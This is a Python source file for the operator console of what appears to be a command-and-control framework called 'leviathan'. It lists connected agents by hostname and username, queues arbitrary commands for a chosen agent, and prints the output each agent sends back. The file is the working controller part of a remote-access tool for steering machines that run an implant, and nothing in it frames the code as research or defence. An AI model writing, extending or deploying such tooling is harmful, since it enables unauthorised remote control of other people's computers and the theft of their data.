import sys
import os

sys.path.insert(0, os.path.dirname(__file__))

from db import list_agents, get_result
from routes import _pending

HELP = """\
agents              List connected agents
cmd <id> <command>  Queue a command for an agent
result <task_id>    Get task output
help                Show this message
exit                Quit"""


def print_agents():
    agents = list_agents()
    if not agents:
        print("No agents connected.")
        return

    for a in agents:
        print(f"  {a['_id']}  {a.get('hostname','?'):20s}  {a.get('username','?'):15s}")


def queue_command(agent_id, command):
    _pending[agent_id] = command
    print(f"Queued for {agent_id}: {command}")


def print_result(task_id):
    result = get_result(task_id)
    if not result:
        print("Result not found.")
        return

    print(f"Agent:   {result['agent_id']}")
    print(f"Command: {result['command']}")
    print(f"Output:\n{result['output']}")


def main():
    while True:
        try:
            line = input("leviathan> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not line:
            continue

        parts = line.split()
        cmd = parts[0]

        if cmd == "exit":
            break
        elif cmd == "help":
            print(HELP)
        elif cmd == "agents":
            print_agents()
        elif cmd == "cmd":
            if len(parts) < 3:
                print("Usage: cmd <agent_id> <command>")
            else:
                queue_command(parts[1], " ".join(parts[2:]))
        elif cmd == "result":
            if len(parts) < 2:
                print("Usage: result <task_id>")
            else:
                print_result(parts[1])
        else:
            print(f"Unknown command: {cmd}")


if __name__ == "__main__":
    main()
